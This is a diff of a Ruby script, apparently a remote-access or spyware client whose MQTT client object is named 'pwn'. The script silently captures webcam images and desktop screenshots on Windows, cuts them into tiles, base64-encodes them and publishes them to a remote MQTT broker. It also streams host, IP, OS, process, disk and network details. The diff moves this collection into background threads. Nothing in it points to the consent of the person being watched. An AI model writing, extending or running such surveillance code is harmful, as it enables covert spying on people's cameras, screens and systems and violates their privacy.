@@ -99,7 +99,7 @@ end
 def webcam()
   if OS.windows? then
     `WebCamImageSave.exe /capture /Filename webcam.png`
-    `magick mogrify -resize 50% webcam.png`
+    `magick mogrify -resize 25% webcam.png`
     `magick convert -crop 10%x10% webcam.png webcam/webcam%d.png`
   else
     `whoami`
@@ -109,7 +109,7 @@ end
 def desktop()
   if OS.windows? then
     `nircmd.exe savescreenshot desktop.png`
-    `magick mogrify -resize 50% desktop.png`
+    `magick mogrify -resize 25% desktop.png`
     `magick convert -crop 10%x10% desktop.png desktop/desktop%d.png`
   else
     `whoami`
@@ -129,43 +129,65 @@ last_ping_time_host_ip_os = Time.now
 last_ping_time_cpu_memory = Time.now
 last_ping_time_disk_network_process = Time.now
 last_ping_time_webcam_desktop = Time.now
+
+Thread.new {
+  loop do
+    if (pwn.internals[:mqtt].connected?) then
+      pwn.publish('reedleoneil/system_info/host', host().to_json)
+      pwn.publish('reedleoneil/system_info/ip', ip().to_json, true, 2)
+      pwn.publish('reedleoneil/system_info/os', os().to_json, true, 2)
+      sleep 60
+    end
+  end
+}
+
+Thread.new {
+  loop do
+    if (pwn.internals[:mqtt].connected?) then
+      pwn.publish('reedleoneil/system_info/cpu', cpu().to_json, true, 2)
+      pwn.publish('reedleoneil/system_info/memory', memory().to_json, true, 2)
+      sleep 3
+    end
+  end
+}
+
+Thread.new {
+  loop do
+    if (pwn.internals[:mqtt].connected?) then
+      pwn.publish('reedleoneil/system_info/disk', disk().to_json, true, 2)
+      pwn.publish('reedleoneil/system_info/network', network().to_json, true, 2)
+      pwn.publish('reedleoneil/system_info/processes', processes().to_json, true, 2)
+      sleep 30
+    end
+  end
+}
+
+Thread.new {
+  loop do
+    if (pwn.internals[:mqtt].connected?) then
+      webcam()
+      for i in 0..99
+        w = Base64.strict_encode64(File.binread('webcam/webcam' + i.to_s + '.png'))
+        p payload = { :cell => i, :img => w }.to_json
+        pwn.publish('reedleoneil/webcam', payload, false, 2)
+        pwn.internals[:mqtt].loop_write
+      end
+      desktop()
+      for i in 0..99
+        d = Base64.strict_encode64(File.binread('desktop/desktop' + i.to_s + '.png'))
+        p payload = { :cell => i, :img => d }.to_json
+        pwn.publish('reedleoneil/desktop', payload, false, 2)
+        pwn.internals[:mqtt].loop_write
+      end
+      sleep 90
+    end
+  end
+}
+
 loop do
 	begin
 		if pwn.internals[:mqtt].connected? then
 			pwn.internals[:mqtt].mqtt_loop
-      if last_ping_time_host_ip_os <= Time.now - 300 then
-        pwn.publish('reedleoneil/system_info/host', host().to_json)
-        pwn.publish('reedleoneil/system_info/ip', ip().to_json, true, 2)
-        pwn.publish('reedleoneil/system_info/os', os().to_json, true, 2)
-        last_ping_time_host_ip_os = Time.now
-			end
-
-      if last_ping_time_cpu_memory <= Time.now - 3 then
-        pwn.publish('reedleoneil/system_info/cpu', cpu().to_json, true, 2)
-        pwn.publish('reedleoneil/system_info/memory', memory().to_json, true, 2)
-        last_ping_time_cpu_memory = Time.now
-			end
-
-      if last_ping_time_disk_network_process <= Time.now - 30 then
-        pwn.publish('reedleoneil/system_info/disk', disk().to_json, true, 2)
-        pwn.publish('reedleoneil/system_info/network', network().to_json, true, 2)
-        pwn.publish('reedleoneil/system_info/processes', processes().to_json, true, 2)
-        last_ping_time_disk_network_process = Time.now
-			end
-
-      if last_ping_time_webcam_desktop <= Time.now - (30 * 3) then
-        webcam()
-        (0..99).each do |i|
-           w = Base64.strict_encode64(File.binread('webcam/webcam' + i.to_s + '.png'))
-           pwn.publish('reedleoneil/webcam', w, false, 2)
-        end
-        desktop()
-        (0..99).each do |i|
-           d = Base64.strict_encode64(File.binread('desktop/desktop' + i.to_s + '.png'))
-           pwn.publish('reedleoneil/desktop', d, false, 2)
-        end
-        last_ping_time_webcam_desktop = Time.now
-			end
 		else
 			pwn.connect() if !pwn.connecting?
 		end
